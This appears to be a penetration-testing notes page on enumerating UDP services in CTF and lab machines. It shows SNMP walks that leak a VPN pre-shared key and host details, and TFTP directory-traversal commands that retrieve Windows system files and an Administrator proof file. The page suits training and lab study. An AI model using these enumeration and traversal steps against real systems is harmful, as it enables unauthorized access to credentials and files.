# UDP services

## SNMP port 161

`snmp-walk` in action

```text
root@kali:~/CTF/HTB/Conceal# snmpwalk -v 1 -c public 10.10.10.116
iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: AMD64 Family 23 Model 49 Stepping 0 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.1
iso.3.6.1.2.1.1.3.0 = Timeticks: (654722) 1:49:07.22
iso.3.6.1.2.1.1.4.0 = STRING: "IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43"
iso.3.6.1.2.1.1.5.0 = STRING: "Conceal"
iso.3.6.1.2.1.1.6.0 = ""
iso.3.6.1.2.1.1.7.0 = INTEGER: 76
iso.3.6.1.2.1.2.1.0 = INTEGER: 15
iso.3.6.1.2.1.2.2.1.1.1 = INTEGER: 1
iso.3.6.1.2.1.2.2.1.1.2 = INTEGER: 2
iso.3.6.1.2.1.2.2.1.1.3 = INTEGER: 3
iso.3.6.1.2.1.2.2.1.1.4 = INTEGER: 4
iso.3.6.1.2.1.2.2.1.1.5 = INTEGER: 5
iso.3.6.1.2.1.2.2.1.1.6 = INTEGER: 6
iso.3.6.1.2.1.2.2.1.1.7 = INTEGER: 7
iso.3.6.1.2.1.2.2.1.1.8 = INTEGER: 8
iso.3.6.1.2.1.2.2.1.1.9 = INTEGER: 9
iso.3.6.1.2.1.2.2.1.1.10 = INTEGER: 10
iso.3.6.1.2.1.2.2.1.1.11 = INTEGER: 11
iso.3.6.1.2.1.2.2.1.1.12 = INTEGER: 12
iso.3.6.1.2.1.2.2.1.1.13 = INTEGER: 13
iso.3.6.1.2.1.2.2.1.1.14 = INTEGER: 14
iso.3.6.1.2.1.2.2.1.1.15 = INTEGER: 15
** snip **
```

Using snmp-check to enumerate running processes which sometimes find versions, assume the community string is **public**

```text
root@kali:~/CTF/PGPractice/ClamAV# snmp-check 192.168.238.42
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 192.168.238.42:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 192.168.238.42
  Hostname                      : 0xbabe.local
  Description                   : Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
  Contact                       : Root <root@localhost> (configure /etc/snmp/snmpd.local.conf)
  Location                      : Unknown (configure /etc/snmp/snmpd.local.conf)
  Uptime snmp                   : 01:59:04.67
  Uptime system                 : 01:58:33.04
  System date                   : 2021-5-26 05:09:59.0

[*] Network information:

  IP forwarding enabled         : no
  Default TTL                   : 64
  TCP segments received         : 806257
  TCP segments sent             : 787410
  TCP segments retrans          : 889
  Input datagrams               : 808455
  Delivered datagrams           : 808455
  Output datagrams              : 789932

[*] Network interfaces:

  Interface                     : [ up ] lo
  Id                            : 1
  Mac Address                   : :::::
  Type                          : softwareLoopback
  Speed                         : 10 Mbps
  MTU                           : 16436
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ up ] eth0
  Id                            : 2
  Mac Address                   : 00:50:56:bf:9e:5e
  Type                          : ethernet-csmacd
  Speed                         : 100 Mbps
  MTU                           : 1500
  In octets                     : 127630436
  Out octets                    : 370213646

  Interface                     : [ down ] sit0
  Id                            : 3
  Mac Address                   : 00:00:00:00:9e:5e
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 1480
  In octets                     : 0
  Out octets                    : 0


[*] Network IP:

  Id                    IP Address            Netmask               Broadcast
  1                     127.0.0.1             255.0.0.0             0
  2                     192.168.238.42        255.255.255.0         1

[*] Routing information:

  Destination           Next hop              Mask                  Metric
  0.0.0.0               192.168.238.254       0.0.0.0               1
  192.168.238.0         0.0.0.0               255.255.255.0         0

[*] TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State
  0.0.0.0               25                    0.0.0.0               0                     listen
  0.0.0.0               80                    0.0.0.0               0                     listen
  0.0.0.0               139                   0.0.0.0               0                     listen
  0.0.0.0               199                   0.0.0.0               0                     listen
  0.0.0.0               445                   0.0.0.0               0                     listen
  0.0.0.0               31337                 0.0.0.0               0                     listen
  192.168.238.42        31337                 192.168.49.238        57350                 established

[*] Listening UDP ports:

  Local address         Local port
  0.0.0.0               137
  0.0.0.0               138
  0.0.0.0               161
  192.168.238.42        137
  192.168.238.42        138

[*] Processes:

  Id                    Status                Name                  Path                  Parameters
  1                     runnable              init                  init [2]
  2                     runnable              ksoftirqd/0           ksoftirqd/0
  3                     runnable              events/0              events/0
  4                     runnable              khelper               khelper
  5                     runnable              kacpid                kacpid
  99                    runnable              kblockd/0             kblockd/0
  109                   runnable              pdflush               pdflush
  110                   runnable              pdflush               pdflush
  111                   runnable              kswapd0               kswapd0
  112                   runnable              aio/0                 aio/0
  255                   runnable              kseriod               kseriod
  276                   runnable              scsi_eh_0             scsi_eh_0
  284                   runnable              khubd                 khubd
  348                   runnable              shpchpd_event         shpchpd_event
  380                   runnable              kjournald             kjournald
  935                   runnable              vmmemctl              vmmemctl
  1177                  runnable              vmtoolsd              /usr/sbin/vmtoolsd
  3772                  running               syslogd               /sbin/syslogd
  3775                  runnable              klogd                 /sbin/klogd
  3780                  runnable              clamd                 /usr/local/sbin/clamd
  3782                  runnable              clamav-milter         /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
  3795                  runnable              nmbd                  /usr/sbin/nmbd        -D
  3797                  runnable              smbd                  /usr/sbin/smbd        -D
  3801                  running               snmpd                 /usr/sbin/snmpd       -Lsd -Lf /dev/null -p /var/run/snmpd.pid
  3802                  runnable              smbd                  /usr/sbin/smbd        -D
  3808                  runnable              sshd                  /usr/sbin/sshd
  3886                  runnable              sendmail-mta          sendmail: MTA: accepting connections
  3900                  runnable              atd                   /usr/sbin/atd
  3903                  runnable              cron                  /usr/sbin/cron
  3910                  runnable              apache                /usr/sbin/apache
  3911                  runnable              apache                /usr/sbin/apache
  3912                  runnable              apache                /usr/sbin/apache
  3913                  runnable              apache                /usr/sbin/apache
  3914                  runnable              apache                /usr/sbin/apache
  3915                  runnable              apache                /usr/sbin/apache
  3931                  runnable              getty                 /sbin/getty           38400 tty1
  3937                  runnable              getty                 /sbin/getty           38400 tty2
  3938                  runnable              getty                 /sbin/getty           38400 tty3
  3939                  runnable              getty                 /sbin/getty           38400 tty4
  3940                  runnable              getty                 /sbin/getty           38400 tty5
  3941                  runnable              getty                 /sbin/getty           38400 tty6
  4044                  runnable              apache                /usr/sbin/apache
  4105                  runnable              apache                /usr/sbin/apache
  4110                  runnable              apache                /usr/sbin/apache
  4111                  runnable              apache                /usr/sbin/apache
  4115                  runnable              apache                /usr/sbin/apache
  4920                  runnable              inetd                 /usr/sbin/inetd
  4940                  runnable              sh                    -i
  4974                  runnable              sshd                  sshd: root@pts/0
  4976                  runnable              bash                  -bash

[*] Storage information:

  Description                   : ["Real Memory"]
  Device id                     : [#<SNMP::Integer:0x0000556ed453a528 @value=2>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x0000556ed4538868 @value=1024>]
  Memory size                   : 250.82 MB
  Memory used                   : 227.24 MB

  Description                   : ["Swap Space"]
  Device id                     : [#<SNMP::Integer:0x0000556ed4533408 @value=3>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x0000556ed4531720 @value=1024>]
  Memory size                   : 203.91 MB
  Memory used                   : 0 bytes

  Description                   : ["/"]
  Device id                     : [#<SNMP::Integer:0x0000556ed452c310 @value=4>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x0000556ed452a628 @value=4096>]
  Memory size                   : 3.74 GB
  Memory used                   : 902.68 MB

  Description                   : ["/sys"]
  Device id                     : [#<SNMP::Integer:0x0000556ed45251c8 @value=5>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x0000556ed4523490 @value=4096>]
  Memory size                   : 0 bytes
  Memory used                   : 0 bytes


[*] File system information:

  Index                         : 1
  Mount point                   : /
  Remote mount point            : -
  Access                        : 1
  Bootable                      : 1

[*] Device information:

  Id                    Type                  Status                Descr
  768                   unknown               unknown               AuthenticAMD: AMD EPYC 7371 16-Core Processor
  1025                  unknown               running               network interface lo
  1026                  unknown               running               network interface eth0
  1027                  unknown               down                  network interface sit0
  1536                  unknown               unknown               VMware Virtual IDE CDROM Drive
  1552                  unknown               unknown               SCSI disk (/dev/sda)
  3072                  unknown               unknown               Guessing that there's a floating point co-processor
```

## TFTP 69

You may be able to to pull any file via directory traversal

```text
root@kali:~/CTF/Box# tftp 10.11.1.121
tftp> get ../../../../../Windows/win.ini
Received 92 bytes in 0.3 seconds
tftp> quit
root@kali:~/CTF/Box# cat win.ini
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
root@kali:~/CTF/Box# tftp 10.11.1.121
tftp> get ../../../../../../../../../../../../../../../Users/Administrator/Desktop/proof.txt
Received 32 bytes in 0.3 seconds
tftp> quit
root@kali:~/CTF/Box# cat proof.txt
<string>
```

